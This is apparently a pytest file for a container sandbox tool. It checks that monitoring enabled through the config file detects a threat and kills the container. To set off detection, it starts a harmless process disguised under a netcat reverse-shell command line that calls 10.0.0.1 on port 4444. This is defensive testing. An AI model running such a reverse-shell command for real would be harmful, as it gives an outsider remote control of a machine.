"""Test monitoring configuration options."""

import subprocess
import time
from pathlib import Path

import pytest

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
    wait_for_container_running,
)


def test_monitoring_enabled_via_config_only(test_workspace, coi_binary):
    """Test monitoring enabled via config file."""
    # Create config with monitoring enabled - include network section for completeness
    config_path = Path.home() / ".coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000

[network]
mode = "restricted"
"""
    )

    try:
        # Start shell (config should enable monitoring)
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "19"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-19"

        if not wait_for_container_running(container_name):
            proc.terminate()
            pytest.fail(f"Container {container_name} did not start")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject malicious command - should be detected via config-enabled monitoring
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'nc -e /bin/bash 10.0.0.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection and kill
        time.sleep(5)

        killed = False
        for _ in range(35):  # a kill (stop + delete) can take ~20s on CI
            time.sleep(1)
            state = get_container_state(container_name)
            if container_absent(container_name):
                killed = True
                break

        # DEBUG: Print state and events if not killed
        if not killed:
            events = get_threat_events(container_name)
            print("\n=== DEBUG: Config test - container not killed ===")
            print(f"Final state: {get_container_state(container_name)}")
            print(f"Total threat events: {len(events)}")
            if events:
                for i, event in enumerate(events):
                    print(
                        f"Event {i}: level={event.get('level')}, "
                        f"desc={event.get('description')[:50] if event.get('description') else 'N/A'}"
                    )
            print("=== END DEBUG ===")

        assert killed, (
            f"Container should be killed (stopped AND deleted) when monitoring enabled via config (final observed state: {state!r})"
        )

        # Wait a moment for audit log to be flushed
        time.sleep(2)

        # Verify threat logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        # DEBUG: Print all events if no critical found
        if len(critical) == 0:
            print("\n=== DEBUG: No CRITICAL events found ===")
            print(f"Container was killed: {killed}")
            print(f"Total events: {len(events)}")
            for i, event in enumerate(events):
                print(f"Event {i}: {event}")
            # Check if audit log exists
            log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
            print(f"Audit log exists: {log_path.exists()}")
            if log_path.exists():
                print(f"Audit log size: {log_path.stat().st_size} bytes")
            print("=== END DEBUG ===\n")

        assert len(critical) > 0, "Expected CRITICAL threat when config enables monitoring"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    finally:
        # Restore original config
        if backup:
            config_path.write_text(backup)
        elif config_path.exists():
            config_path.unlink()
